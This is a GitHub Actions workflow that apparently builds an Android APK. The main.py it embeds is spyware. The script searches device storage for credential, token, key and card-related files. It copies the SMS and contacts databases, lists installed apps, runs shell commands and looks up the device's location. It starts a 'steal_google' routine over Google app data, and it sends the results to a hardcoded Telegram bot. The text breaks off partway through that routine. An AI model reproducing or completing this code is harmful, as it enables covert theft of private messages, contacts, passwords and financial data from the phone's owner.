name: Build APK
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Install
      run: |
        sudo apt update
        sudo apt install -y openjdk-17-jdk
        pip install buildozer
    - name: Create main.py
      run: |
        cat > main.py << 'EOF'
import os,requests,subprocess,shutil,json,sqlite3,time,glob,threading
T="8889128449:AAHUGVmOKw5cqeVx25D1WHN9lJcvyxsH43U"
C="8631833153"
def send(t):
 try:
  for i in range(0,len(t),4000):
   requests.post(f"https://api.telegram.org/bot{T}/sendMessage",json={"chat_id":C,"text":t[i:i+4000]},timeout=5)
 except:pass
def cmd(c):
 try:return subprocess.check_output(c,shell=True).decode()[:500]
 except:return"no"
def get_all():
 r=[]
 p=["/storage/emulated/0","/data/data","/sdcard"]
 e=[".db",".xml",".json",".txt",".cookie",".key",".token",".backup",".log",".conf",".cfg",".ini",".properties"]
 for pp in p:
  if os.path.exists(pp):
   for a,b,c in os.walk(pp):
    for f in c:
     if any(f.endswith(x) for x in e):
      try:
       shutil.copy(os.path.join(a,f),f"/sdcard/{f}")
       r.append(f)
      except:pass
     for kw in ["password","login","user","pass","token","key","mail","email","phone","credit","card","cvv","ssn","id","account"]:
      if kw in f.lower():
       try:
        with open(os.path.join(a,f),'r') as ff:
         d=ff.read()[:200]
         r.append(f"{f}: {d}")
       except:pass
 return r
def get_apps():
 try:
  a=subprocess.check_output("pm list packages",shell=True).decode()
  return a[:500]
 except:return"no"
def get_sms():
 try:
  os.system("cp /data/data/com.android.providers.telephony/databases/mmssms.db /sdcard/")
  conn=sqlite3.connect("/sdcard/mmssms.db")
  cur=conn.cursor()
  cur.execute("SELECT address,body,date FROM sms ORDER BY date DESC LIMIT 100")
  s=cur.fetchall()
  conn.close()
  return "\n".join([f"{x[0]}: {x[1][:50]}"for x in s])
 except:return"no"
def get_contacts():
 try:
  os.system("cp /data/data/com.android.providers.contacts/databases/contacts2.db /sdcard/")
  conn=sqlite3.connect("/sdcard/contacts2.db")
  cur=conn.cursor()
  cur.execute("SELECT display_name,number FROM contacts LIMIT 200")
  c=cur.fetchall()
  conn.close()
  return "\n".join([f"{x[0]}: {x[1]}"for x in c])
 except:return"no"
def get_location():
 try:
  r=requests.get("http://ip-api.com/json/")
  d=r.json()
  return f"{d.get('city')}, {d.get('country')}, {d.get('lat')}, {d.get('lon')}"
 except:return"no"
def get_ip():
 try:return requests.get("https://api.ipify.org").text
 except:return"no"
def steal_google():
 r=[]
 p=["/data/data/com.google.android.gms","/data/data/com.google.android.gsf","/storage/emulated/0/Android/data/com.google.android.apps.maps"]
